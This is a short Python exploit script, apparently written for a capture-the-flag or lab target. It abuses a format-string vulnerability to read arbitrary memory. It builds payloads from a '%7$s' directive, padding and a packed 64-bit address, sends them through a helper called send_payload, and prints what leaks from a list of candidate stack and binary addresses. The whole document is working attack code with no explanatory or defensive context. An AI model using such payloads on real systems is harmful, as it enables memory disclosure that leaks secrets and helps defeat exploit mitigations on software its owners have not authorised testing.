import struct
from mirage import send_payload

def deref(addr, slot=7):
    a = struct.pack("<Q", addr)
    directive = ("%%%d$s" % slot).encode()
    pad = b"A" * (8 - len(directive))
    payload = directive + pad + a + b"\n"
    b, r = send_payload(payload)
    return r

candidates = [
    0x7ffe7c398530, 0x7ffe7c3985e0, 0x7ffe7c398560, 0x7ffe7c3984f0,
    0x7ffe7c398620, 0x7ffe7c398630, 0x7ffe7c3984d0, 0x4b5140,
    0x44668c, 0x40b840, 0x46b5ed, 0x489448, 0x40fc2d, 0x40fe39, 0x487c1b
]
for c in candidates:
    r = deref(c)
    print(hex(c), "->", r)
